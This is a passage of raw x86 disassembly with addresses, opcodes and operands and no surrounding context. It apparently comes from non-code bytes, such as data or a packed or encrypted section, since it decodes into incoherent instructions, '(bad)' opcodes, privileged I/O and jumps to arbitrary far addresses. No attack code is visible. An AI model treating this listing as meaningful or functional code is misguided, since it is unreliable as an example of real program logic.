  41c098:	sub    eax,0xef424db3
  41c09d:	lods   al,BYTE PTR ds:[esi]
  41c09e:	dec    ebx
  41c09f:	add    BYTE PTR [ecx+0x4f338e4f],bh
  41c0a5:	add    ebx,ecx
  41c0a7:	xchg   edx,ecx
  41c0a9:	fdiv   DWORD PTR [edi]
  41c0ab:	stos   DWORD PTR es:[edi],eax
  41c0ac:	and    eax,0xb35bdbb8
  41c0b1:	imul   BYTE PTR [ecx-0x2d6d6d1a]
  41c0b7:	inc    esp
  41c0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0b9:	cmp    BYTE PTR [edx+0x5a],0xf7
  41c0bd:	pop    edi
  41c0be:	adc    bh,BYTE PTR [ebx]
  41c0c0:	js     0x41c07e
  41c0c2:	xor    al,0xea
  41c0c4:	hlt    
  41c0c5:	push   eax
  41c0c6:	mov    bh,0xcc
  41c0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0c9:	aad    0xc4
  41c0cb:	shl    cl,0xc3
  41c0ce:	lods   eax,DWORD PTR ds:[esi]
  41c0cf:	clc    
  41c0d0:	lds    ebx,FWORD PTR fs:[eax+0x7028a243]
  41c0d7:	repz int 0x2
  41c0da:	mov    esp,DWORD PTR [ebp+0x27db0015]
  41c0e0:	ins    DWORD PTR es:[edi],dx
  41c0e1:	shl    BYTE PTR ds:0x8f841a0c,cl
  41c0e7:	sbb    eax,0x1a74414c
  41c0ec:	(bad)  
  41c0ed:	fstp   DWORD PTR ds:0x3ba59e20
  41c0f3:	inc    eax
  41c0f4:	mov    ebx,0x185fa2b2
  41c0f9:	inc    ebx
  41c0fa:	inc    edx
  41c0fb:	add    al,0x12
  41c0fd:	and    ecx,DWORD PTR [edx]
  41c0ff:	push   ecx
  41c100:	add    ecx,DWORD PTR [ecx]
  41c102:	add    bl,BYTE PTR [ebp-0x31a77684]
  41c108:	jnp    0x41c108
  41c10a:	adc    ah,0x95
  41c10d:	xor    BYTE PTR ds:0x8fad6baa,bh
  41c113:	sbb    DWORD PTR [edx+0xb9c43da],0x44
  41c11a:	adc    edx,0xffffff95
  41c11d:	mov    BYTE PTR ds:0x5fdc579c,0x3c
  41c124:	jg     0x41c115
  41c126:	es jb  0x41c1a8
  41c129:	stos   BYTE PTR es:[edi],al
  41c12a:	adc    eax,0x9735ec45
  41c12f:	pop    ecx
  41c130:	cmp    bh,dl
  41c132:	add    ebp,DWORD PTR [ebp-0x5e35b55]
  41c138:	ins    DWORD PTR es:[edi],dx
  41c139:	mov    bh,0x5b
  41c13b:	sbb    BYTE PTR [esi+edi*4+0x44c1bd99],cl
  41c142:	adc    eax,0xa2263824
  41c147:	add    eax,0xb90261ca
  41c14c:	scas   al,BYTE PTR es:[edi]
  41c14d:	xor    al,0x43
  41c14f:	cmp    esi,ecx
  41c151:	adc    al,0xb2
  41c153:	push   ecx
  41c154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c155:	pop    ss
  41c156:	test   al,0x64
  41c158:	cdq    
  41c159:	ds ret 0xb96c
  41c15d:	inc    ecx
  41c15e:	loopne 0x41c17a
  41c160:	pop    edx
  41c161:	mov    DWORD PTR [ebp-0x79805e0d],0x9d457f57
  41c16b:	test   BYTE PTR [edx+0x9d17db8],dl
  41c171:	fld    TBYTE PTR [ebp-0x48]
  41c174:	(bad)  
  41c176:	cwde   
  41c177:	retf   
  41c178:	push   cs
  41c179:	loope  0x41c123
  41c17b:	jo     0x41c186
  41c17d:	sub    eax,0x7f924224
  41c182:	sub    edi,ebp
  41c184:	mov    edi,0x900bf064
  41c189:	and    BYTE PTR [edx+0x8],bh
  41c18c:	xchg   esp,eax
  41c18d:	or     DWORD PTR [edx+ebp*1-0x39de2d2],ebp
  41c194:	push   cs
  41c195:	add    BYTE PTR [ebx+0x2b],cl
  41c198:	and    dh,BYTE PTR [esi]
  41c19a:	adc    bh,bh
  41c19c:	loopne 0x41c1b7
  41c19e:	in     eax,dx
  41c19f:	or     DWORD PTR [eax],esi
  41c1a1:	pop    ecx
  41c1a2:	dec    ecx
  41c1a3:	lds    ebx,FWORD PTR [edx+0x26]
  41c1a6:	jb     0x41c1d1
  41c1a8:	adc    eax,0xecae2073
  41c1ad:	sar    cl,cl
  41c1af:	sub    eax,0x141bc4ee
  41c1b4:	adc    al,0x71
  41c1b6:	add    DWORD PTR [edx-0x665ff7a6],ebx
  41c1bc:	push   es
  41c1bd:	hlt    
  41c1be:	mov    dl,0x40
  41c1c0:	inc    edx
  41c1c1:	xor    al,0xbd
  41c1c3:	into   
  41c1c4:	cwde   
  41c1c5:	cld    
  41c1c6:	dec    ebx
  41c1c7:	fwait
  41c1c8:	mov    ecx,0xda7a4fab
  41c1cd:	jne    0x41c18c
  41c1cf:	aaa    
  41c1d0:	out    dx,eax
  41c1d1:	cwde   
  41c1d2:	xor    al,BYTE PTR gs:[edx-0x15]
  41c1d6:	cli    
  41c1d7:	fidiv  WORD PTR [eax+0x6b]
  41c1da:	mov    ah,0xf1
  41c1dc:	ins    DWORD PTR es:[edi],dx
  41c1dd:	loopne 0x41c259
  41c1df:	jl     0x41c17c
  41c1e1:	or     edi,DWORD PTR [edi]
  41c1e3:	mov    WORD PTR [eax+0x19],?
  41c1e6:	xor    BYTE PTR ss:[ebx-0x78],dl
  41c1ea:	std    
  41c1eb:	repnz lods eax,DWORD PTR ds:[esi]
  41c1ed:	jns    0x41c194
  41c1ef:	ss push ss
  41c1f1:	pop    ds
  41c1f2:	not    DWORD PTR [ecx]
  41c1f4:	mov    eax,es:0x3579aa2c
  41c1fa:	rol    BYTE PTR [eax+edi*4+0x7430feca],cl
  41c201:	sbb    bl,dh
  41c203:	mov    ecx,0x8cf054fd
  41c208:	xchg   edx,eax
  41c209:	int    0x62
  41c20b:	int    0xfc
  41c20d:	push   ds
  41c20e:	mov    ds:0xaf4370c8,eax
  41c213:	mov    eax,0x131b1715
  41c218:	repnz adc eax,0xc3d6baea
  41c21e:	dec    ebx
  41c21f:	mov    ds:0xeb64e869,eax
  41c224:	lahf   
  41c225:	jnp    0xd6b758fd
  41c22b:	mov    dh,0x6b
  41c22d:	lods   al,BYTE PTR ds:[esi]
  41c22e:	fidiv  WORD PTR [edx+ecx*8-0x35]
  41c232:	pop    edx
  41c233:	and    dl,BYTE PTR [ebp+ecx*2-0x70bcc2e0]
  41c23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c23b:	jge    0x41c298
  41c23d:	pushf  
  41c23e:	inc    edi
  41c23f:	jnp    0x41c1e4
  41c241:	or     DWORD PTR ds:0x3017997,ecx
  41c247:	mov    ch,0xbd
  41c249:	dec    ebx
  41c24a:	imul   ebx,ecx,0xe284030f
  41c250:	and    dl,ch
  41c252:	push   es
  41c253:	dec    ecx
  41c254:	shl    bl,0x9
  41c257:	dec    ecx
  41c258:	mov    dh,0xf3
  41c25a:	and    BYTE PTR [ecx],0x85
  41c25d:	out    dx,eax
  41c25e:	clc    
  41c25f:	in     al,dx
  41c260:	sub    cl,bl
  41c262:	aaa    
  41c263:	or     al,0x24
  41c265:	inc    edi
  41c266:	lock cmp eax,0x34ebd694
  41c26c:	dec    edi
  41c26d:	pop    esp
  41c26e:	push   ecx
  41c26f:	cwde   
  41c270:	and    eax,0xf3323a03
  41c275:	rol    ah,cl
  41c277:	sahf   
  41c278:	jle    0x41c215
  41c27a:	loope  0x41c2f4
  41c27c:	inc    esi
  41c27d:	mov    ch,0xef
  41c27f:	pop    edx
  41c280:	in     al,dx
  41c281:	dec    ebx
  41c282:	dec    edx
  41c283:	jno    0x41c20c
  41c285:	(bad)  
  41c286:	loopne 0x41c280
  41c288:	std    
  41c289:	(bad)
  41c28e:	call   0xc7ca:0x30ade828
  41c295:	cld    
  41c296:	xchg   DWORD PTR [esi],esi
  41c298:	dec    edx
  41c299:	fsub   st(0),st
  41c29b:	out    dx,al
  41c29c:	or     al,BYTE PTR [edi]
  41c29e:	sti    
  41c29f:	cmp    ebx,edi
  41c2a1:	sbb    esi,DWORD PTR [edi]
  41c2a3:	ret    0x36de
  41c2a6:	out    0xe9,eax
  41c2a8:	pop    ecx
  41c2a9:	jmp    0x5e61:0x40e5bcac
  41c2b0:	pop    ebx
  41c2b1:	icebp  
  41c2b2:	outs   dx,BYTE PTR ds:[esi]
  41c2b3:	xlat   BYTE PTR ds:[ebx]
  41c2b4:	fldenv [edi+0x2a69a8e4]
  41c2ba:	push   0xffffff93
  41c2bc:	ds aad 0xba
  41c2bf:	les    eax,FWORD PTR [esi]
  41c2c1:	jb     0x41c290
  41c2c3:	test   DWORD PTR [ecx+0x12],edi
  41c2c6:	in     eax,0x6a
  41c2c8:	pop    es
  41c2c9:	dec    edx
  41c2ca:	mov    eax,ds:0x62b623d4
  41c2cf:	jbe    0x41c278
  41c2d1:	add    al,0x79
  41c2d3:	outs   dx,BYTE PTR ds:[esi]
  41c2d4:	fld    DWORD PTR [edx+ecx*8-0x45]
  41c2d8:	test   eax,0x3377f572
  41c2dd:	cli    
  41c2de:	pop    esp
  41c2df:	lea    esi,[edx]
  41c2e1:	inc    esp
  41c2e2:	add    DWORD PTR [eax+esi*4+0x509f5062],esi
  41c2e9:	cdq    
  41c2ea:	mov    eax,ds:0xa96e188c
  41c2ef:	push   esp
  41c2f0:	or     DWORD PTR [ecx],0x8c6157e0
  41c2f6:	cmp    ah,BYTE PTR [ebp+0x1d9452b6]
  41c2fc:	adc    BYTE PTR [edx+0x42],ah
  41c2ff:	int3   
  41c300:	cwde   
  41c301:	xor    BYTE PTR [edx],al
  41c303:	daa    
  41c304:	adc    dl,BYTE PTR [edi-0x57de74a9]
  41c30a:	test   edx,edx
  41c30c:	jae    0x41c2c7
  41c30e:	or     DWORD PTR [eax+ebx*1-0x46c06623],edi
  41c315:	sahf   
  41c316:	and    edx,DWORD PTR [eax]
  41c318:	push   edi
  41c319:	jae    0x41c35e
  41c31b:	inc    edx
  41c31c:	lods   eax,DWORD PTR ds:[esi]
  41c31d:	xchg   ebx,eax
  41c31e:	dec    esi
  41c31f:	data16 sbb bh,ch
  41c322:	int3   
  41c323:	enter  0x49ec,0x3d
  41c327:	dec    ebp
  41c328:	ins    DWORD PTR es:[edi],dx
  41c329:	scas   eax,DWORD PTR es:[edi]
  41c32a:	sahf   
  41c32b:	xchg   BYTE PTR [edx+0x6df30108],cl
  41c331:	out    0xc9,al
  41c333:	xor    ch,BYTE PTR [edi-0x6]
  41c336:	and    dh,al
  41c338:	loopne 0x41c396
  41c33a:	ret    
  41c33b:	mov    fs,WORD PTR [edi+eax*4-0x3f]
  41c33f:	cld    
  41c340:	mov    ah,0xea
  41c342:	and    eax,0xe70aaace
  41c347:	push   ebp
  41c348:	ins    DWORD PTR es:[edi],dx
  41c349:	out    0xba,al
  41c34b:	dec    eax
  41c34c:	cmp    BYTE PTR [ebx-0x79],ch
  41c34f:	mov    cs,ebx
  41c351:	int3   
  41c352:	mov    ch,0xf5
  41c354:	daa    
  41c355:	mov    fs,WORD PTR ds:0xc654b89
  41c35b:	shl    BYTE PTR [esi-0x54],cl
  41c35e:	call   0xbd8ef747
  41c363:	mov    bh,0x8c
  41c365:	push   ebx
  41c366:	ret    0x7742
  41c369:	into   
  41c36a:	push   edx
  41c36b:	push   ecx
  41c36c:	add    al,0x4d
  41c36e:	outs   dx,BYTE PTR ds:[si]
  41c370:	push   0x69
  41c372:	xchg   BYTE PTR [ebp-0x66],dl
  41c375:	jl     0x41c33e
  41c377:	push   ecx
  41c378:	aaa    
  41c379:	lea    edx,[ebx-0x2b9ef744]
  41c37f:	mov    WORD PTR [ecx-0x42],gs
  41c382:	cs cld 
  41c384:	cmp    BYTE PTR [esi+ebx*4-0x40dc6960],ch
  41c38b:	out    dx,eax
  41c38c:	mov    DWORD PTR [edx+0x30],esp
  41c38f:	cmp    ch,BYTE PTR [esi+0x6a]
  41c392:	test   eax,0xbc466675
  41c397:	jno    0x41c3d1
  41c399:	rcr    BYTE PTR [ebp-0x7533894],1
  41c39f:	jo     0x41c364
  41c3a1:	jo     0x41c360
  41c3a3:	mov    al,ds:0x84488f7f
  41c3a8:	mov    ecx,0xeb585486
  41c3ad:	lea    esi,[esi-0x2f]
  41c3b0:	lods   al,BYTE PTR ds:[esi]
  41c3b1:	jecxz  0x41c41d
  41c3b3:	jg     0x41c3dc
  41c3b5:	ja     0x41c412
  41c3b7:	loope  0x41c3b0
  41c3b9:	lods   eax,DWORD PTR ds:[esi]
  41c3ba:	add    al,0xe9
  41c3bc:	rcl    DWORD PTR [esi],0xb6
  41c3bf:	adc    dh,BYTE PTR [edi+edi*4+0x2254417a]
  41c3c6:	mov    al,0x5f
  41c3c8:	or     BYTE PTR [edi+0x10],ch
  41c3cb:	inc    ecx
  41c3cc:	arpl   WORD PTR [edi+0x4989e2d0],di
  41c3d2:	pop    edi
  41c3d3:	imul   esi,ecx,0x69ff3466
  41c3d9:	jne    0x41c45a
  41c3db:	push   ebx
  41c3dc:	sti    
  41c3dd:	mov    ebp,0xa9d968ae
  41c3e2:	mov    dl,0x70
  41c3e4:	sub    al,0x96
  41c3e6:	sbb    ebp,DWORD PTR [edx-0x2e]
  41c3e9:	fstp   st(5)
  41c3eb:	pop    esi
  41c3ec:	retf   0xfbae
  41c3ef:	call   0xe47f6ee3
  41c3f4:	jne    0x41c466
  41c3f6:	jle    0x41c3ef
  41c3f8:	aas    
  41c3f9:	js     0x41c446
  41c3fb:	push   ecx
  41c3fc:	test   BYTE PTR [ecx],dh
  41c3fe:	sub    eax,0x6f7266f9
  41c403:	add    ah,BYTE PTR [esi+esi*2-0x339a9b74]
  41c40a:	sub    DWORD PTR [ecx],edi
  41c40c:	inc    edi
  41c40d:	not    BYTE PTR [eax]
  41c40f:	push   0x7fbfb4dd
  41c414:	ret    0x5eb0
  41c417:	arpl   WORD PTR [eax-0x2459ecff],sp
  41c41d:	add    BYTE PTR [edx],0x12
  41c420:	jne    0x41c492
  41c422:	push   esi
  41c423:	mov    bh,0xd6
  41c425:	pop    es
  41c426:	xchg   DWORD PTR [ecx],esi
  41c428:	sub    BYTE PTR [esi],bl
  41c42a:	jl     0x41c480
  41c42c:	(bad)  
  41c42d:	adc    eax,0x7ee2cbfc
  41c432:	pop    edi
  41c433:	fwait
  41c434:	sub    al,0x30
  41c436:	push   edi
  41c437:	int3   
  41c438:	jp     0x41c44a
  41c43a:	mov    ds:0xd0ac98c4,al
  41c43f:	inc    edi
  41c440:	fwait
  41c441:	cdq    
  41c442:	add    BYTE PTR [eax-0x3b],dl
  41c445:	jo     0x41c3cb
  41c447:	mov    al,ds:0xb250decc
  41c44c:	xor    al,0x8b
  41c44e:	aaa    
  41c44f:	push   0x88aa7ae0
  41c454:	xchg   edx,eax
  41c455:	cmc    
  41c456:	cmp    BYTE PTR [eax],0x4c
  41c459:	push   ebp
  41c45a:	jbe    0x41c3fb
  41c45c:	out    0xfc,eax
  41c45e:	iret   
  41c45f:	stos   DWORD PTR es:[edi],eax
  41c460:	ins    BYTE PTR es:[edi],dx
  41c461:	pop    ebx
  41c462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c463:	jbe    0x41c4d9
  41c465:	test   eax,0x8a1cef84
  41c46a:	cli    
  41c46b:	mov    ?,ebx
  41c46d:	xchg   ebx,eax
  41c46e:	dec    esi
  41c46f:	sub    esp,ebp
  41c471:	ret    0xab91
  41c474:	jb     0x41c414
  41c476:	ja     0x41c446
  41c478:	jns    0x41c4b0
  41c47a:	sbb    DWORD PTR [ecx+0x6a],esi
  41c47d:	mov    dh,bl
  41c47f:	nop
  41c480:	cmovbe ebx,DWORD PTR [ecx]
  41c483:	cmp    DWORD PTR ds:[ebp-0x4d773e12],ecx
  41c48a:	xchg   edx,eax
  41c48b:	dec    edx
  41c48c:	inc    esi
  41c48d:	sub    eax,0x5766d91d
  41c492:	scas   eax,DWORD PTR es:[edi]
  41c493:	adc    eax,0x4ccaa986
  41c498:	jae    0x41c4cc
  41c49a:	ret    0x3979
  41c49d:	inc    ebx
  41c49e:	ja     0x41c44d
  41c4a0:	mov    edx,DWORD PTR [edi]
  41c4a2:	repz (bad) 
  41c4a4:	and    DWORD PTR [eax],edi
  41c4a6:	pop    ebp
  41c4a7:	xchg   edx,eax
  41c4a8:	sub    al,bh
  41c4aa:	jp     0x41c517
  41c4ac:	leave  
  41c4ad:	mov    al,0x2b
  41c4af:	xchg   DWORD PTR [edx+0x67],edi
  41c4b2:	cmp    al,0xe2
  41c4b4:	out    0x10,eax
  41c4b6:	xchg   edx,eax
  41c4b7:	stos   DWORD PTR es:[edi],eax
  41c4b8:	adc    eax,0xf45f65d
  41c4bd:	and    BYTE PTR [ecx+0x17],ah
  41c4c0:	repnz icebp 
  41c4c2:	pusha  
  41c4c3:	in     eax,dx
  41c4c4:	add    eax,DWORD PTR [edi]
  41c4c6:	data16 jge 0x41c516
  41c4c9:	stos   DWORD PTR es:[edi],eax
  41c4ca:	sar    BYTE PTR [esi],0x34
  41c4cd:	aaa    
  41c4ce:	pop    ecx
  41c4cf:	out    0x51,eax
  41c4d1:	mov    bl,0xe7
  41c4d3:	loopne 0x41c543
  41c4d5:	dec    esp
  41c4d6:	inc    ecx
  41c4d7:	xchg   ebx,eax
  41c4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d9:	and    al,0x84
  41c4db:	fisttp WORD PTR [edx-0x525aa0ce]
  41c4e1:	or     al,0x24
  41c4e3:	pop    ebx
  41c4e4:	(bad)  
  41c4e5:	lods   eax,DWORD PTR ds:[esi]
  41c4e6:	mov    esp,0x5a67414f
  41c4eb:	rcr    ch,1
  41c4ed:	retf   
  41c4ee:	hlt    
  41c4ef:	cli    
  41c4f0:	jnp    0x41c567
  41c4f2:	leave  
  41c4f3:	lahf   
  41c4f4:	in     al,0xf2
  41c4f6:	push   ss
  41c4f7:	add    al,0x24
  41c4f9:	loop   0x41c56b
  41c4fb:	mov    ecx,0xb924123
  41c500:	out    0xb4,al
  41c502:	mov    ds:0x9d58f62d,al
  41c507:	loopne 0x41c4ee
  41c509:	xchg   edi,eax
  41c50a:	dec    ebx
  41c50b:	(bad)  
  41c50c:	jo     0x41c561
  41c50e:	inc    esi
  41c50f:	rcr    BYTE PTR [ebx+0x1b],cl
  41c512:	ins    BYTE PTR es:[edi],dx
  41c513:	pop    edx
  41c514:	pop    esp
  41c515:	mov    ebx,0x297de06a
  41c51a:	iret   
  41c51b:	ret    0x5f8b
  41c51e:	pop    edx
  41c51f:	or     eax,0xd89b2b2a
  41c524:	mul    BYTE PTR [ebx+ebp*8+0x54]
  41c528:	hlt    
  41c529:	aam    0x17
  41c52b:	jmp    0x41c4ca
  41c52d:	inc    esi
  41c52e:	pop    ebx
  41c52f:	std    
  41c530:	aad    0x3e
  41c532:	and    ebx,edx
  41c534:	pusha  
  41c535:	ins    DWORD PTR es:[edi],dx
  41c536:	adc    eax,0xd0646b63
  41c53b:	ds cmc 
  41c53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c53e:	lahf   
  41c53f:	push   0x248f7d25
  41c544:	dec    esp
  41c545:	adc    bl,bl
  41c547:	add    DWORD PTR [edx-0x48e11cf1],eax
  41c54d:	pop    ebp
  41c54e:	mov    BYTE PTR [edi-0x3eb6f77a],bh
  41c554:	or     al,0xc9
  41c556:	push   edi
  41c557:	repz push ds
  41c559:	pop    ebp
  41c55a:	add    eax,0x4f1b1cef
  41c55f:	jg     0x41c507
  41c561:	scas   al,BYTE PTR es:[edi]
  41c562:	mov    edi,0x4bfc3214
  41c567:	lahf   
  41c568:	loop   0x41c5b8
  41c56a:	dec    edx
  41c56b:	or     BYTE PTR [ecx+0x1a3cd58b],dl
  41c571:	jo     0x41c55c
  41c573:	push   0x5
  41c575:	inc    ebx
  41c576:	mov    eax,0x55693467
  41c57b:	push   ebx
  41c57c:	fnstcw WORD PTR [ecx-0x37e17bb]
  41c582:	mov    bh,0x89
  41c584:	add    eax,0xee8f6913
  41c589:	retf   0x429e
  41c58c:	(bad)  
  41c58d:	mov    WORD PTR [eax-0x58f8ab55],fs
  41c593:	inc    edx
  41c594:	(bad)  
  41c595:	fadd   DWORD PTR [ecx]
  41c597:	in     eax,dx
  41c598:	dec    esp
  41c599:	push   eax
  41c59a:	jae    0x41c533
  41c59c:	mov    ds:0xae2f9bc3,eax
  41c5a1:	dec    ebp
  41c5a2:	dec    edi
  41c5a3:	inc    eax
  41c5a4:	mov    DWORD PTR [edx+0x61],0xea8dc820
  41c5ab:	jae    0x41c591
  41c5ad:	jl     0x41c532
  41c5af:	xchg   ebp,eax
  41c5b0:	dec    ebx
  41c5b1:	ins    BYTE PTR es:[edi],dx
  41c5b2:	xlat   BYTE PTR ds:[ebx]
  41c5b3:	fdivr  QWORD PTR ds:0x5b72b266
  41c5b9:	lods   al,BYTE PTR ds:[esi]
  41c5ba:	adc    DWORD PTR [ebp+0x79e2d345],ecx
  41c5c0:	mov    WORD PTR [edx+0x250d16d9],?
  41c5c6:	mov    db0,ebp
  41c5c9:	push   es
  41c5ca:	adc    DWORD PTR [ecx+0x7c52baa1],ebp
  41c5d0:	jae    0x41c606
  41c5d2:	xchg   edx,eax
  41c5d3:	call   0x2ea6:0x53bc04dd
  41c5da:	mov    bh,BYTE PTR [edi]
  41c5dc:	cmp    eax,DWORD PTR [eax+0x68]
  41c5df:	gs out dx,eax
  41c5e1:	pop    edi
  41c5e2:	adc    BYTE PTR [ecx-0x47b80e7e],dl
  41c5e8:	shl    DWORD PTR [ebx-0x5c1f615f],cl
  41c5ee:	fist   WORD PTR ds:0x438a7280
  41c5f4:	mov    dh,dl
  41c5f6:	repnz and ch,BYTE PTR [edx-0x73]
  41c5fa:	fist   DWORD PTR [esi+ebp*8+0x53cde730]
  41c601:	adc    esp,DWORD PTR [edx+ecx*2]
  41c604:	stos   DWORD PTR es:[edi],eax
  41c605:	test   eax,0x3a6024aa
  41c60a:	(bad)  
  41c60b:	out    dx,eax
  41c60c:	jl     0x41c604
  41c60e:	sti    
  41c60f:	das    
  41c610:	es mov edi,es
  41c613:	test   al,0xa
  41c615:	les    eax,FWORD PTR [eax+edx*2+0x27]
  41c619:	shl    DWORD PTR [ebp+0x12],1
  41c61c:	jbe    0x41c651
  41c61e:	ins    DWORD PTR es:[edi],dx
  41c61f:	shl    esi,cl
  41c621:	xchg   DWORD PTR [eax+0x63db95b8],esp
  41c627:	xor    eax,0x92ebc37e
  41c62c:	icebp  
  41c62d:	popa   
  41c62e:	stos   DWORD PTR es:[edi],eax
  41c62f:	lahf   
  41c630:	aam    0xd1
  41c632:	cmp    esi,ebp
  41c634:	bnd jl 0x41c655
  41c637:	jmp    0xcae6d1cd
  41c63c:	push   ebp
  41c63d:	mov    al,ds:0x2099af84
  41c642:	mov    bl,0x5c
  41c644:	int3   
  41c645:	test   DWORD PTR [ebp+0x32],ebp
  41c648:	cmc    
  41c649:	add    eax,0xbd046c1f
  41c64e:	inc    ebx
  41c64f:	sbb    BYTE PTR [ecx+0x69],ch
  41c652:	dec    sp
  41c654:	xor    eax,0xdca94093
  41c659:	lea    ecx,[eax]
  41c65b:	pop    esi
  41c65c:	outs   dx,BYTE PTR ds:[esi]
  41c65d:	jmp    0x41c627
  41c65f:	xchg   esp,eax
  41c660:	mov    edx,0x9d0536e2
  41c665:	pop    esp
  41c666:	mov    ebp,0x7180e2d5
  41c66b:	or     al,0x45
  41c66d:	ret    0xbeb6
  41c670:	inc    BYTE PTR [ecx+edx*2+0x16ed96db]
  41c677:	icebp  
  41c678:	and    esi,ebp
  41c67a:	push   ebx
  41c67b:	dec    edx
  41c67c:	xor    DWORD PTR [ebp+0x48b6b392],edi
  41c682:	jo     0x41c628
  41c684:	xchg   edi,eax
  41c685:	inc    esi
  41c686:	sub    eax,0x224e13eb
  41c68b:	mov    edx,0x8de5af5
  41c690:	xchg   esp,eax
  41c691:	push   esp
  41c692:	jns    0x41c680
  41c694:	sub    al,bh
  41c696:	mov    esp,0xef208cd6
  41c69b:	outs   dx,BYTE PTR ds:[esi]
  41c69c:	cwde   
  41c69d:	imul   ecx,edi,0x80c1ba6b
  41c6a3:	or     eax,DWORD PTR [ecx-0x5230ac84]
  41c6a9:	fsub   QWORD PTR [ebp-0x35fa2b7f]
  41c6af:	loope  0x41c71d
  41c6b1:	inc    ebp
  41c6b2:	outs   dx,DWORD PTR ds:[esi]
  41c6b3:	(bad)
  41c6b8:	mov    eax,0xb1e99023
  41c6bd:	xchg   ebx,eax
  41c6be:	add    al,0xb
  41c6c0:	rcl    ecx,cl
  41c6c2:	push   DWORD PTR [esp+ecx*1-0x77e54c1e]
  41c6c9:	outs   dx,DWORD PTR ds:[esi]
  41c6ca:	shl    DWORD PTR [ecx],1
  41c6cc:	outs   dx,BYTE PTR ds:[esi]
  41c6cd:	cmp    ebx,edx
  41c6cf:	shl    BYTE PTR [ebx+0x9],cl
  41c6d2:	(bad)  
  41c6d3:	sub    eax,0xeb686f7d
  41c6d8:	out    dx,al
  41c6d9:	das    
  41c6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6db:	seto   BYTE PTR [eax-0x17]
  41c6df:	mov    ds:0xfed70598,eax
  41c6e4:	inc    esi
  41c6e5:	jno    0x41c6bb
  41c6e7:	push   ss
  41c6e8:	mov    DWORD PTR [eax],edx
  41c6ea:	cmc    
  41c6eb:	or     edx,edx
  41c6ed:	cmp    DWORD PTR [edx-0x39991c0b],esp
  41c6f3:	lahf   
  41c6f4:	mov    eax,0x15900be3
  41c6f9:	pop    esi
  41c6fa:	jnp    0x41c740
  41c6fc:	adc    ah,BYTE PTR ds:0x6a9d4cff
  41c702:	stc    
  41c703:	pusha  
  41c704:	jg     0x41c744
  41c706:	and    BYTE PTR [esi+0x28ce2528],dl
  41c70c:	imul   edi,DWORD PTR [eax-0x2e277b19],0x9
  41c713:	repz and ebx,edi
  41c716:	jecxz  0x41c70f
  41c718:	stos   BYTE PTR es:[di],al
  41c71a:	mov    eax,0x2dedf715
  41c71f:	push   ss
  41c720:	pop    ss
  41c721:	cmp    al,0x35
  41c723:	dec    edx
  41c724:	pop    ds
  41c725:	mov    ebx,0x988cf9d
  41c72a:	(bad)  
  41c72b:	not    ebx
  41c72d:	inc    esp
  41c72e:	cmp    ch,BYTE PTR [edx]
  41c730:	mov    WORD PTR [esi-0x105d28e7],gs
  41c736:	aas    
  41c737:	sbb    BYTE PTR [edx-0x3f],al
  41c73a:	aas    
  41c73b:	xor    eax,0xd50b89ee
  41c740:	cld    
  41c741:	shl    al,1
  41c743:	or     DWORD PTR [esi+ebx*1],eax
  41c746:	sub    bh,BYTE PTR [ebx]
  41c748:	rcl    BYTE PTR [edi],0x40
  41c74b:	lds    esp,FWORD PTR [bx+di+0x1c52]
  41c750:	add    esp,DWORD PTR [ebp+0x4b]
  41c753:	div    BYTE PTR [edx+ebp*8]
  41c756:	or     BYTE PTR [ecx-0x2a],dl
  41c759:	icebp  
  41c75a:	sar    BYTE PTR [eax-0x2],cl
  41c75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c75e:	or     DWORD PTR [ecx-0x1d],edi
  41c761:	cld    
  41c762:	add    al,bl
  41c764:	adc    DWORD PTR [edi+0xe],0x737b6877
  41c76b:	rcr    DWORD PTR [ebx-0x37],cl
  41c76e:	rcr    DWORD PTR [ebx],1
  41c770:	mov    bl,0xe0
  41c772:	into   
  41c773:	inc    esp
  41c774:	mov    eax,ds:0x5316b0aa
  41c779:	repnz mov edx,0x9284939b
  41c77f:	jo     0x41c7d4
  41c781:	xchg   DWORD PTR [ebp+0x383da1d6],esi
  41c787:	ror    BYTE PTR [eax],0xb7
  41c78a:	cmp    eax,0x7cd58222
  41c78f:	jmp    0x4c6a1b99
  41c794:	mov    ah,BYTE PTR [ecx-0x18]
  41c797:	jno    0x41c7e9
  41c799:	pop    edx
  41c79a:	bound  eax,QWORD PTR es:0xc1ab8569
  41c7a1:	cmp    BYTE PTR [eax],bh
  41c7a3:	out    dx,eax
  41c7a4:	push   ss
  41c7a5:	adc    DWORD PTR [esi+edx*4-0x3d],ebx
  41c7a9:	sahf   
  41c7aa:	jo     0x41c75a
  41c7ac:	jne    0x41c78d
  41c7ae:	pop    esp
  41c7af:	out    dx,eax
  41c7b0:	fisttp DWORD PTR [eax]
  41c7b2:	xchg   ecx,eax
  41c7b3:	sub    eax,0x94c483b6
  41c7b8:	imul   ebx,ebp,0x469e38c0
  41c7be:	cmp    BYTE PTR [ebx],al
  41c7c0:	lds    ebp,FWORD PTR [ebx-0x37800b30]
  41c7c6:	or     DWORD PTR [edi-0x74],ebp
  41c7c9:	call   0x763f:0x1725c73c
  41c7d0:	retf   
  41c7d1:	sbb    eax,0x958e0f58
  41c7d6:	std    
  41c7d7:	dec    ecx
  41c7d8:	sti    
  41c7d9:	dec    esp
  41c7da:	push   cs
  41c7db:	add    eax,0xb91f43c5
  41c7e0:	leave  
  41c7e1:	pop    edx
  41c7e2:	mov    cs,WORD PTR [ebx]
  41c7e4:	xchg   edx,eax
  41c7e5:	aas    
  41c7e6:	mov    ch,0x66
  41c7e8:	push   eax
  41c7e9:	add    eax,0x82c88620
  41c7ee:	loop   0x41c827
  41c7f0:	retf   
  41c7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f2:	push   esi
  41c7f3:	jle    0x41c77e
  41c7f5:	jne    0x41c78d
  41c7f7:	inc    eax
  41c7f8:	jmp    0x608e:0xfba83fb9
  41c7ff:	jns    0x41c788
  41c801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c802:	neg    BYTE PTR ds:0x4fd45a84
